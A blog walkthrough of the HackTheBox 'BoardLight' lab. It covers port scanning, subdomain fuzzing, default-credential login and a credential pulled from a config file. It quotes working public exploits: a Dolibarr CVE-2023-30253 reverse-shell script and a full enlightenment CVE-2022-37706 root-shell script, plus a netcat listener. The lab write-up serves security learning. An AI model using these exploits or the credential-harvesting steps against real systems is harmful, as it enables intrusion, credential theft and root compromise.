---
layout: post
title: HackTheBox Boardlight WalkThrough
subtitle: How to get user and root flags on the HTB lab ServMon
thumbnail-img: assets/img/htb_boardlight/htb_boardlight.png
share-img: assets/img/htb_boardlight/htb_boardlight.png
tags: [hackthebox,htb,boardlight,red-team,linux,privilege-escalation,dns-fuzzing,security,walkthrough,python]
author: Will
---

# HackTheBox Boardlight

![](assets/img/htb_boardlight/htb_boardlight.png)

image source: https://labs.hackthebox.com/storage/avatars/7768afed979c9abe917b0c20df49ceb8.png

## ***Warning: This tutorial is for educational purposes only. Do not try any techniques discussed here on systems you do not own or without explicit permission from the owner.***

Hello!  I am going to go over how I solved the HTB challenge "BoardLight". This challenge mainly goes over red-team fundamentals like port scanning, DNS fuzzing, getting a reverse shell, searching through config files, and linux privilege escalation. 

Let's get started:
### Connecting to the Lab:
You can use HTB's VPN connection or with their Pwnbox. I am going to connect over OpenVPN using a local VM I spun up of ParrotOS. 

If you connect via OpenVPN, you can use the following command once you receive the .ovpn file from HTB:

```console
sudo openvpn lab_willanalyze.ovpn
```

This will initiate a giant wall of text that details your connection. As long as you see the words "Initialization Sequence Completed" in that wall, you should be good to go!

### Reconnaissance and Data Gathering:

#### nmap:

For those who don't know, nmap is a port scanning tool used for a variety of purposes. This includes, but is not limited to: system reconnaissance, security auditing, and troubleshooting

nmap is extremely versatile and I highly recommend you go through the documentation to learn about everything nmap can do: https://nmap.org/docs.html

That said, I am going to keep it simple with my command. This is the nmap command I almost always start with on easy HTB boxes as it usually gets me most of the info I need. 

```console
nmap -sC -sV [INSERT_IP_HERE]
#ol’ reliable
```

To recap what this command means:
**-sV** tells nmap to find, if possible, the version of software. This is extremely important from an attacker's perspective as this could potentially find out-of-date software that can be exploited.
**-sC** tells nmap to run a list of default scripts against the host to check things like supported ciphers, http headers, ssh-hostkeys, etc.

Here is what I got:

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_00-10-38.png)

Two main ports open: port 22 running ssh and port 80 running http (specifically an app running on an ubuntu server with apache).

While I don’t want to rule either out, I am going to prioritize port 80 as I believe it will be the easier target. This is mainly because there are more exploits you can do with webpages than with SSH

This time around, I didn't see an HTTP title come up, so I am going to just use the IP to see the site. There may be a hint about what domain we can use.

clicking around the site, it looks like a cybersecurity firm, let's see how it holds up!

Nothing much on the site yet it seems. Something I did notice was an email on the bottom of the homepage:

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_00-28-16.png)

this seems to be their domain, let's try to use it and see what happens:
#### /etc/hosts

You can add the entry manually using a text editor like Vim, NeoVim, or Nano but I will just stick with a simple echo pipe:

```console
sudo echo “[INSERT_IP_HERE] board.htb” >> /etc/hosts
```

Now if we go to http://board.htb, we should see the page come up:

![[Screenshot_from_2024-09-20_02-18-08.png)

#### ffuf

ffuf is a DNS fuzzing tool that is written in Go that tests for the existence of certain subdomains and directories by brute forcing a list containing common names. You can use any list, but the one I will be using is contained within the SecList collection. You can get both ffuf and SecLists here:

ffuf: https://github.com/ffuf/ffuf

SecLists: https://github.com/danielmiessler/SecLists

Here, I would like to scan both subdomains and directories. This will allow us to get as much information about the site as possible

subdomain ffuf command:

``` bash
ffuf -u http://board.htb/ -H "Host: FUZZ.board.htb" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
```

upon our initial scan, we will see a *bunch* of 200 codes. Good news, right? However if you go through and access any of them, there's nothing. It seems like there are a bunch of empty domains that we have to filter out.

![](assets/img/htb_boardlight/Screenshot_from_2024-09-23_02-22-58.png)

luckily, ffuf has a method to filter these domains based on size. I will now only include domains larger than the size for the empty domains: 15949

``` bash
ffuf -u http://board.htb/ -H "Host: FUZZ.board.htb" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -c -fs 15949
```
![](assets/img/htb_boardlight/Screenshot_from_2024-09-23_02-21-00.png)

Looks like we got an actual domain! crm.board.htb

Let's look to see if there are any interesting directories as well

directory scan command:

``` bash
ffuf -u http://board.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt 
```

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_00-34-09.png)

this seems to have some pretty standard apache server directories. While interesting, I am going to prioritize the crm.board.htb directory and see what that has.

to do this, make sure to add the crm subdomain to the hosts file:

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_00-39-39.png)

ok now we navigate to the crm page we find that they use something called Dolibarr (version 17.0.0):

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_00-45-56.png)

for giggles I decided to try some known default passwords like "admin:password" and "admin:admin". Sure enough, admin:admin worked! (you'd expect a bit more from a security company)

It looks like we don't all that much access aside from creating websites. This might be good to upload a reverse shell or something but let's look elsewhere for now.

I'm going to go ahead and search for any CVEs associated with Dolibarr 17.0.0

And the first result comes up with a github page containing an exploit for Dolibar <=17.0.0: CVE-2023-30253

It can be found on nikn0laty's github here: https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

Before we begin using the exploit, I am going to look at the script to see if I can find out how it works:

### Weaponization (done for us)/ Delivery

For brevity, I'm just going to show the main method:

from: https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py

``` python
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="---[Reverse Shell Exploit for Dolibarr <= 17.0.0 (CVE-2023-30253)]---", usage= "python3 exploit.py <TARGET_HOSTNAME> <USERNAME> <PASSWORD> <LHOST> <LPORT>\r\nexample: python3 exploit.py http://example.com login password 127.0.0.1 9001")
    parser.add_argument("hostname", help="Target hostname")
    parser.add_argument("username", help="Username of Dolibarr ERP/CRM")
    parser.add_argument("password", help="Password of Dolibarr ERP/CRM")
    parser.add_argument("lhost", help="Listening host for reverse shell")
    parser.add_argument("lport", help="Listening port for reverse shell")

    args = parser.parse_args()
    min_required_args = 5
    if len(vars(args)) != min_required_args:
        parser.print_usage()
        exit()

    site_name = str(uuid.uuid4()).replace("-","")[:10]
    base_url = args.hostname + "/index.php"
    auth_url = args.hostname + "/index.php?mainmenu=home"
    admin_url = args.hostname + "/admin/index.php?mainmenu=home&leftmenu=setup&mesg=setupnotcomplete"
    call_reverse_shell_url = args.hostname + "/public/website/index.php?website=" + site_name + "&pageref=" + site_name

    pre_login_token = get_csrf_token(base_url, auth_headers)

    if pre_login_token == "":
        print("[!] Cannot get pre_login_token, please check the URL") 
        exit()

    print("[*] Trying authentication...")
    print("[**] Login: " + args.username)
    print("[**] Password: " + args.password)

    auth(pre_login_token, args.username, args.password, auth_url, auth_headers)
    time.sleep(1)

    login_token = get_csrf_token(admin_url, auth_headers)

    if login_token == "":
        print("[!] Cannot get login_token, please check the URL") 
        exit()

    http_connection = http.client.HTTPConnection(remove_http_prefix(args.hostname))

    print("[*] Trying created site...")
    create_site(args.hostname, login_token, site_name, http_connection)
    time.sleep(1)

    print("[*] Trying created page...")
    create_page(args.hostname, login_token, site_name, http_connection)
    time.sleep(1)

    print("[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection")
    edit_page(args.hostname, login_token, site_name, args.lhost, args.lport, http_connection)

    http_connection.close()
    time.sleep(1)
    requests.get(call_reverse_shell_url)

    print("[!] If you have not received the shell, please check your login and password")
```

looks like we are on to something with the page idea!

Overall, the script logs in with the admin account, makes a page and calls a reverse shell within that page. Let's go ahead and use it:

to do so, I am running the following commands:
``` bash
cd hackthebox
mkdir permx #just creating a folder to store everything

#these next three lines are from Rai2en's github
git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
cd Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/

chmod +x exploit.py #granting execute perms to the files
```

Before we run the command, we are going to open up a port on my machine to receive the reverse shell via netcat:

``` bash
nc -nlvp 8080 -s [INSERT_LOCAL_VPN_IP_HERE]
```

to break down this input:

**nc**: stands for netcat, a networking tool that allows for us to open up ports and make connections (among other things)
**-lnvp** is just the four following flags combined into one for convenience:
	**-l**: means it is using a listening port
	**-n**: numeric IP only (I haven't given my workstation a hostname so I'm only using IP)
	**-v**: verbose output, helpful for troubleshooting
	**-p**: indicates that we will be specifying the port number. I did 8080, but you can chose any valid port number not currently in use
**8080**: the port number we are using
**-s**: local source address, insert your IP that HTB assigned your machine via VPN. You can either find it through the command line with commands like **ifconfig**, **ip address**, or you can just find it in your machine connection:

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_01-48-18.png)

after establishing the netcat session, now I run the following command:

``` python
python3 exploit.py http://crm.board.htb admin admin 10.10.14.14 8080
```

and we're in! it looks like we have landed using the www-data user like we did with PermX (link to the walkthrough here: https://willanalyze.com/2024-09-14-HackTheBox_PermX_Walkthrough/):

### Exploit/Installation

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_01-55-29.png)

I'm going to use some similar techniques to last time:

**grep -E '^UID_MIN\|^UID_MAX' /etc/login.defs** this gives me the minimum and maximum UID of normal (non-system) users, here we learn that the min is 1000 and the max is 6000

**getent passwd {1000..6000}** here I am going to get all users in the /etc/passwd with UIDs in the normal user range, here we establish that the only normal user is "larissa"

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_02-02-03.png)

From here, we are going to try and find some "low hanging fruit" so we can find some credentials.

I am going to go to the home directory and see if I can find config files:

instead of just doing trial and error like I did in permx, I am going to use the find command to find any file with "conf"

``` bash
find / -name 'conf' 
```

we get a bunch of "permission denied" messages but we eventually see 

**/var/www/html/crm.board.htb/htdocs/conf**

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_02-18-39.png)

let's change to that directory:

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_02-22-50.png)

now let's cat and grep conf.php for "pass":

``` bash
cat conf.php | grep "pass"
```

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_02-27-12.png)

and now we have a password: serverfun2$2023!!

### Command and Control

let's try sshing in with the larissa user and see if the password works:

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_02-30-25.png)

we're in! we now have a foothold in the system. with a quick 

``` bash
ls -las
```

we should see user.txt, the user flag will be in there. 

### Privilege escalation

Trying "sudo -l", we don't see anything Larissa can run as root unfortunately.

Before we run a dedicated tool, I want to see if any file has permission to run as root, starting in the root directory. to do this, I am going to use the perm command:

``` bash
find / -type f -perm -u=s
```
this is finding any files (-type f for file) with the permission for a user to run with sudo (-u=s with u for user and s for sudo)

we get a bunch of system files and directories which aren't surprising.

That is except for some directories called "enlightenment":

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_02-55-53.png)

I went ahead and copy and pasted one of these into duckduckgo and found a github page containing an exploit for **CVE-2022-37706**:

https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit

This is a exploit created by MaherAzzouzi using a simple but effective shell script:

from: https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh

``` bash
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///n
```

it looks like it is looking for high-permission directories using enlightenment, creating a directory in tmp, opening up shell, and we then have a shell.

Just recreate the steps from earlier to copy the exploit script to your local machine:

``` bash
git clone https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
cd CVE-2022-37706-LPE-exploit/
chmod +x exploit.sh 
```

Now to copy the file over, I am going to use SCP to put it on the server using the larissa account:

```
scp exploit.sh larissa@board.htb:/home/larissa
```

now we go back to our ssh session and run the exploit:

![](assets/img/htb_boardlight/Screenshot_From_2024-09-23_03-16-21.png)

now navigate to /root and open up root.txt to get the flag.

Hoped this helped. Happy Hacking!
